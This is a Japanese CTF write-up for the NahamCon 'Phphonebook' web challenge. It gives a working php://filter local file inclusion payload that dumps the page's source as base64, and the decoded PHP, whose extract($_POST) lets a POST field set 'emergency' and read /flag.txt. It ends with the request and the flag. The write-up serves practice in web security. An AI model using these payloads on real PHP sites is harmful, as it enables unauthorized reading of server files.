# Phphonebook

100pt (561 Solves)

```txt
Ring ring! Need to look up a number? This phonebook has got you covered! But you will only get a flag if it is an emergency!

Connect here: [url]
```

## 概要

アクセスすると以下のような文。

```txt
Sorry! You are in /index.php/?file=

The phonebook is located at phphonebook.php
```

GETのfileでいい感じに読み込んでくれるのだろう。  
`/index.php?file=phphonebook.php`にアクセスしてみると以下のような感じ

![Phphonebook](./img/Phphonebook.png)

## 解

以下のURLで`phphonebook.php`がbase64エンコードされて手に入る。

```txt
/index.php?file=php://filter/convert.base64-encode/resource=phphonebook.php
```

```txt
PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDx0aXRsZT5QaHBob25lYm9vazwvdGl0bGU+CiAgICA8bGluayBocmVmPSJtYWluLmNzcyIgcmVsPSJzdHlsZXNoZWV0Ij4KICA8L2hlYWQ+CgogIDxib2R5IGNsYXNzPSJiZyI+CiAgICA8aDEgaWQ9ImhlYWRlciI+IFdlbGNvbWUgdG8gdGhlIFBocGhvbmVib29rIDwvaDE+CgogICAgPGRpdiBpZD0iaW1fY29udGFpbmVyIj4KCiAgICAgIDxpbWcgc3JjPSJib29rLmpwZyIgd2lkdGg9IjUwJSIgaGVpZ2h0PSIzMCUiLz4KCiAgICAgIDxwIGNsYXNzPSJkZXNjIj4KICAgICAgVGhpcyBwaHBob25lYm9vayB3YXMgbWFkZSB0byBsb29rIHVwIGFsbCBzb3J0cyBvZiBudW1iZXJzISBIYXZlIGZ1bi4uLgogICAgICA8L3A+CgogICAgPC9kaXY+Cjxicj4KPGJyPgogICAgPGRpdj4KICAgICAgPGZvcm0gbWV0aG9kPSJQT1NUIiBhY3Rpb249IiMiPgogICAgICAgIDxsYWJlbCBpZD0iZm9ybV9sYWJlbCI+RW50ZXIgbnVtYmVyOiA8L2xhYmVsPgogICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJudW1iZXIiPgogICAgICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJTdWJtaXQiPgogICAgICA8L2Zvcm0+CiAgICA8L2Rpdj4KCiAgICA8ZGl2IGlkPSJwaHBfY29udGFpbmVyIj4KICAgIDw/cGhwCiAgICAgIGV4dHJhY3QoJF9QT1NUKTsKCiAgICAJaWYgKGlzc2V0KCRlbWVyZ2VuY3kpKXsKICAgIAkJZWNobyhmaWxlX2dldF9jb250ZW50cygiL2ZsYWcudHh0IikpOwogICAgCX0KICAgID8+CiAgPC9kaXY+CiAgPC9icj4KICA8L2JyPgogIDwvYnI+CgoKPGRpdiBzdHlsZT0icG9zaXRpb246Zml4ZWQ7IGJvdHRvbToxJTsgbGVmdDoxJTsiPgo8YnI+PGJyPjxicj48YnI+CjxiPiBOT1QgQ0hBTExFTkdFIFJFTEFURUQ6PC9iPjxicj5USEFOSyBZT1UgdG8gSU5USUdSSVRJIGZvciBzdXBwb3J0aW5nIE5haGFtQ29uIGFuZCBOYWhhbUNvbiBDVEYhCjxwPgo8aW1nIHdpZHRoPTYwMHB4IHNyYz0iaHR0cHM6Ly9kMjR3dXE2bzk1MWkyZy5jbG91ZGZyb250Lm5ldC9pbWcvZXZlbnRzL2lkLzQ1Ny80NTc3NDgxMjEvYXNzZXRzL2Y3ZGEwZDcxOGViNzdjODNmNWNiNjIyMWEwNmEyZjQ1LmludGkucG5nIj4KPC9wPgo8L2Rpdj4KCiAgPC9ib2R5Pgo8L2h0bWw+
```

デコードすると以下。

```php
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Phphonebook</title>
    <link href="main.css" rel="stylesheet">
  </head>

  <body class="bg">
    <h1 id="header"> Welcome to the Phphonebook </h1>

    <div id="im_container">

      <img src="book.jpg" width="50%" height="30%"/>

      <p class="desc">
      This phphonebook was made to look up all sorts of numbers! Have fun...
      </p>

    </div>
<br>
<br>
    <div>
      <form method="POST" action="#">
        <label id="form_label">Enter number: </label>
        <input type="text" name="number">
        <input type="submit" value="Submit">
      </form>
    </div>

    <div id="php_container">
    <?php
      extract($_POST);

        if (isset($emergency)){
            echo(file_get_contents("/flag.txt"));
        }
    ?>
  </div>
  </br>
  </br>
  </br>


<div style="position:fixed; bottom:1%; left:1%;">
<br><br><br><br>
<b> NOT CHALLENGE RELATED:</b><br>THANK YOU to INTIGRITI for supporting NahamCon and NahamCon CTF!
<p>
<img width=600px src="https://d24wuq6o951i2g.cloudfront.net/img/events/id/457/457748121/assets/f7da0d718eb77c83f5cb6221a06a2f45.inti.png">
</p>
</div>

  </body>
</html>
```

postに`emergency`が含まれてると`flag.txt`を読みだしてくれるようだ。
よしなにpostリクエスト送ればflag。

```txt
POST /index.php?file=phphonebook.php HTTP/1.1
Host: jh2i.com:50002
(snip)

emergency=1
----------------------------------------------------------
HTTP/1.1 200 OK
Date: Fri, 12 Jun 2020 18:39:52 GMT
(snip)

flag{phon3_numb3r_3xtr4ct3d}
```
